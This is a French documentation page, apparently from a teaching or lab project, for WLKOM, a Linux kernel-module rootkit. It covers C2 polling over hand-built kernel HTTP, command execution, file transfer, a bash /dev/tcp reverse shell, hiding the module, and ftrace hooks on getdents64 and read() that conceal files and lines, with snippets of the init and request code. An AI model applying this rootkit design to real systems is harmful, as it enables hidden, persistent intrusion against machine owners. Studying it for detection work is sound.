---
title: Rootkit (LKM)
description: Vue d'ensemble du module noyau Linux WLKOM — fonctionnalités, cycle de vie et concepts clés.
---

Un module noyau Linux chargé sur la victime : polling, exécution, transfert, dissimulation.

## Informations du module

| Propriété | Valeur |
|-----------|--------|
| Nom du module | `wlkom.ko` |
| Langage | C (espace noyau) |
| Noyau cible | Linux ≥ 5.0 (testé sur 6.6 LTS) |
| Intervalle de polling | 5 secondes |
| Limite de transfert de fichiers | 64 Kio (`FILE_BUF_SIZE`) |
| Stockage UUID | `/rootkit/uuid` |

## Fonctionnalités

| Fonctionnalité | Catégorie | Description |
|----------------|-----------|-------------|
| [Connexion & Polling](/fr/rootkit/connection) | Obligatoire | Enregistrement au C2 au chargement, polling toutes les 5 s |
| [Exécution de commandes](/fr/rootkit/exec) | Obligatoire | Exécuter des commandes shell, capturer stdout/stderr/code retour |
| [Upload / Download](/fr/rootkit/upload-download) | Optionnel | Transfert de fichiers bidirectionnel sur HTTP |
| [Reverse Shell](/fr/rootkit/reverse-shell) | Bonus | Session bash interactive vers l'attaquant |
| [Cacher le module](/fr/rootkit/hide-module) | Optionnel | Retrait de `lsmod`, `/proc/modules`, `/sys/module/` |
| [Cacher les fichiers](/fr/rootkit/hide-files) | Optionnel | Hook `getdents64` pour masquer le répertoire du rootkit |
| [Cacher les lignes](/fr/rootkit/hide-lines) | Optionnel | Hook `read()` pour filtrer les lignes du contenu des fichiers |

## Qu'est-ce qu'un rootkit ?

Un **rootkit** est un logiciel conçu pour obtenir un accès persistant et caché à une machine, en gardant cet accès secret aux yeux du propriétaire du système et des outils de sécurité. Le terme vient du monde Unix : *root* (le compte administrateur) + *kit* (un ensemble d'outils).

WLKOM est un **rootkit au niveau noyau** — il tourne à l'intérieur du noyau Linux lui-même plutôt que dans l'espace utilisateur. Cela lui donne un contrôle total sur le système : il peut intercepter n'importe quel appel système, manipuler les structures de données du noyau, et rester invisible à tout processus tournant en espace utilisateur.

## Les modules noyau Linux (LKM)

Un **Linux Kernel Module** est un morceau de code objet qui peut être chargé dans un noyau en cours d'exécution sans redémarrage. Il tourne en **ring 0**, le niveau d'exécution CPU le plus privilégié, avec accès direct à toutes les APIs noyau, à la mémoire et au matériel.

Deux points d'entrée définissent le cycle de vie d'un LKM :

```c
static int __init wlkom_init(void) {
    hide_module();   // retrait de lsmod / /proc/modules
    c2_init();       // connexion au C2, démarrage du thread de polling
    return 0;
}

static void __exit wlkom_exit(void) {
    c2_cleanup();    // arrêt du polling, libération des ressources
}

module_init(wlkom_init);
module_exit(wlkom_exit);
```

Le module est chargé avec `insmod wlkom.ko c2_host=<IP>` et se cache immédiatement, devenant invisible dans `lsmod` ou `/proc/modules`. Il démarre ensuite un thread noyau qui contacte périodiquement le serveur C2.

## HTTP en espace noyau

L'un des plus grands défis de ce projet est d'implémenter un **client HTTP depuis zéro dans le noyau Linux**. Il n'y a pas de bibliothèque standard, pas de libc, pas de `curl`. À la place, l'API socket du noyau (`sock_create`, `kernel_connect`, `kernel_sendmsg`, `kernel_recvmsg`) est utilisée pour ouvrir une connexion TCP brute et écrire des requêtes HTTP/1.0 manuellement sous forme de chaînes d'octets.

**Pourquoi HTTP/1.0 et pas 1.1 ?**
- HTTP/1.0 ferme la connexion après chaque requête — pas besoin de gérer des connexions persistantes ou le chunked transfer encoding
- Pas de `Transfer-Encoding: chunked` à analyser
- Chaque réponse se termine quand le serveur ferme la socket — simple à détecter

```c
// Construction d'une requête HTTP/1.0 brute
snprintf(buf, sizeof(buf),
    "GET %s HTTP/1.0\r\n"
    "Host: %s\r\n"
    "Connection: close\r\n"
    "\r\n", path, c2_host);

// Envoi via la socket TCP noyau
kvec.iov_base = buf;
kvec.iov_len  = strlen(buf);
kernel_sendmsg(sock, &msg, &kvec, 1, kvec.iov_len);
```

## Hooking des appels système via ftrace

WLKOM hooke deux syscalls via **ftrace**, le framework de tracing natif du noyau. L'alternative classique — effacer le bit WP dans CR0 et patcher la table des syscalls directement — a d'abord été tentée mais a **paniqué le noyau** sur Arch Linux 6.6 à cause de `CONFIG_STRICT_KERNEL_RWX`, qui enforce les permissions des pages au niveau MMU indépendamment de CR0.

ftrace fonctionne en redirigeant l'instruction `call __fentry__` que le compilateur insère en début de chaque fonction noyau. Le hook installe un callback `ftrace_ops` qui réécrit `regs->ip` pour pointer vers la fonction de remplacement — sans toucher aucune page read-only.

Deux appels sont hookés :

**`getdents64`** — appelé par `ls`, `find` et tout listage de répertoire. Le hook vérifie si le fd pointe vers un répertoire de `hidden_dirs[]` (par inode) et retourne 0 dans ce cas. Pour les autres répertoires, il appelle l'original et filtre les entrées dont le nom commence par un préfixe de `hide_prefixes[]`.

**`read()`** — appelé chaque fois qu'un processus lit un fichier. Le hook ignore les fichiers non réguliers (PTY, sockets, pipes) via un check `S_ISREG`, puis analyse le buffer à la recherche de lignes correspondant à `hide_lines[]` et les supprime avant de retourner à l'appelant.

## Arborescence des sources

```
rootkit/src/
├─ wlkom_main.c   Point d'entrée du module, appelle hide_module() puis c2_init()
├─ c2.c           Client HTTP, enregistrement UUID, polling, envoi résultats, transfert fichiers
├─ exec.c         Exécution de commandes via call_usermodehelper(), reverse shell via bash /dev/tcp
├─ hide.c         Toute la dissimulation : hide_module(), hook_getdents64, hook_read via ftrace
└─ utils.c        Helpers I/O fichiers noyau : read_file() et write_file() via VFS
```
